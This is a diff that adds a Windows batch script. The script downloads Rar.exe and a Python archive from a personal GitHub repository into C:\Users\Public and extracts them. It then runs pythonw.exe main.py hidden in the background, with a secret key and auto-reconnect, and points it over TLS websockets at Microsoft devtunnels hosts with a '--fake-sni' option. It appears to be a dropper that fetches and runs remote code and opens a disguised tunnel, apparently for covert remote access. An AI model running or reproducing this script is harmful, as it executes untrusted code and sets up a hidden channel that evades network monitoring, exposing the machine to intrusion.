@@ -1,0 +1,37 @@
+@echo off
+cd /d "C:\Users\Public"
+
+echo Downloading Rar.exe...
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Rar.exe' -OutFile 'Rar.exe'"
+
+if not exist "Rar.exe" (
+    echo Rar.exe download failed
+    pause
+    exit /b 1
+)
+
+echo Downloading Python395.rar...
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Python395.rar' -OutFile 'Python395.rar'"
+
+if not exist "Python395.rar" (
+    echo Python395.rar download failed
+    pause
+    exit /b 1
+)
+
+if exist "Rar.exe" (
+    Rar.exe x -o+ "Python395.rar"
+) else (
+    echo Rar.exe not found in C:\Users\Public
+    pause
+    exit /b 1
+)
+
+cd "Python395"
+if exist "pythonw.exe" (
+    pythonw.exe main.py -c tunnels-prod-rel-jpe1-v3-cluster.japaneast.cloudapp.azure.com:443 -s 278b9e49a263725d67285ac3eaa99ba3 --reconnect 3 --up ws --tls --domain 2g6xjjwt-7799.jpe1.devtunnels.ms --fake-sni tunnels-prod-rel-jpe1-v3-cluster.japaneast.cloudapp.azure.com
+) else (
+    echo pythonw.exe not found in Python395 directory
+    pause
+    exit /b 1
+)
